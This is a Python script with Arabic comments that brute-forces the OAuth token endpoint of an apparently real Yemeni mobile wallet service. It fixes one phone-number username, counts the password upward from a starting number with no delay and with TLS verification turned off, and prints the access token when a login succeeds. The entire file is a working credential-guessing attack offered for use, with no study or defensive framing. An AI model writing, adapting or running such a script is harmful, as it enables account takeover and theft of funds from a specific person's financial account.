import requests
import time
from requests.exceptions import RequestException

# إلغاء تحذيرات SSL
requests.packages.urllib3.disable_warnings()

# 🔹 الإعدادات الأساسية (ثابتة)
BASE_URL = "https://app.jawali-ye.com.ye:8473/walletmobileproxy/"
ENDPOINT = "oauth/token"
FULL_URL = BASE_URL + ENDPOINT

# 🔹 بيانات الاعتماد الأساسية (سيتم تعديل password لاحقًا)
BASE_DATA = {
    "grant_type": "password",
    "client_id": "restapp",
    "client_secret": "restapp",
    "username": "772490746",
    "scope": "openid"
}

# 🔹 كلمة المرور الأولية
initial_password = 142800730
MAX_ATTEMPTS = 5000000000000000000000000  # أقصى عدد من المحاولات (سيتم زيادة password كل محاولة)

def get_access_token():
    """محاولة الحصول على التوكن، مع زيادة password عند كل خطأ"""
    current_password = initial_password

    for attempt in range(1, MAX_ATTEMPTS + 1):
        # نسخ البيانات الأساسية وتحديث password
        data = BASE_DATA.copy()
        data["password"] = str(current_password)

        print(f"🔄 المحاولة {attempt}/{MAX_ATTEMPTS} - كلمة المرور: {current_password}")

        try:
            response = requests.post(FULL_URL, data=data, verify=False, timeout=10)
            
            if response.status_code == 200:
                json_response = response.json()
                print("✅ تم الحصول على التوكن بنجاح!")
                print(f"📦 الرد الكامل: {json_response}")
                print(f"🔑 التوكن: {json_response.get('access_token')}")
                print(f"⏳ ينتهي بعد: {json_response.get('expires_in')} ثانية")
                return json_response
            else:
                # الرد خطأ (كود غير 200)
                print(f"⚠️  كود الاستجابة: {response.status_code} - الرد: {response.text}")
                #print(f"❌ فشل المحاولة بكلمة المرور {current_password}")

        except RequestException as e:
            print(f"❌ خطأ في الاتصال (محاولة {attempt}): {e}")

        # إذا لم تكن المحاولة الأخيرة، نزيد password وننتظر قليلاً
        if attempt < MAX_ATTEMPTS:
            current_password += 1
            print(f"⏳ زيادة كلمة المرور إلى {current_password} وإعادة المحاولة بعد 1 ثانية...")
            time.sleep(0.0)

    print("❌ فشلت جميع المحاولات (بعد زيادة password عدة مرات).")
    return None

# 🔹 تشغيل البوت
if __name__ == "__main__":
    token_data = get_access_token()
    if token_data:
        print("✅ البوت يعمل بنجاح.")
    else:
        print("❌ تعذر الحصول على التوكن.")
